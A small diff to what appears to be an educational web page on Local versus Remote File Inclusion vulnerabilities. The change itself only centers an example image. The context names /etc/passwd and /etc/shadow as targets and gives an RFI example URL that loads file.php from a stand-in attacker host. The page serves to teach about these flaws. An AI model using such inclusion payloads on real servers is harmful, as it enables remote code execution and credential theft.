@@ -10,7 +10,8 @@ In the easiest way if we want to explain it
 When hacker is exploiting RFI he uses a Remote File while on the other side LFI uses local files when they are attacking server,
 even the name of the vulnerability tells you that. While exploiting LFI you can get response from the local files on system, 
 for example <code> /etc/passwd </code> or <code> /etc/shadow </code>.
-<img src="lfi-example.PNG"/>
+<br>
+<center> <img src="lfi-example.PNG"/> </center>
 <br>
 On the other hand while exploiting RFI you can upload file from remote server which in 99% will result in 
 RCE(Remote Code Execution). For example <code> https://www.site.com/app.php?file=http://attackers.website.com/file.php </code>.
